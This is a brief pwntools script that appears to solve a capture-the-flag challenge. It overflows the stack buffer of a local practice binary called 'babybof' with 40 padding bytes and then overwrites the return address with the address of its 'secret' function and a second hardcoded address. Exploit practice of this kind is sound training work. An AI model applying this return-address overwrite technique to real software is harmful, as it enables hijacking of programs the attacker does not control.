from pwn import *

exe = ELF("./babybof", checksec=False)
p = process(exe.path)

payload = b'A' * 40
payload += p64(exe.symbols['secret'])
payload += p64(0x0000000000401332)

p.sendlineafter(':', payload)

output = p.recvall().decode(errors="ignore")
print(output)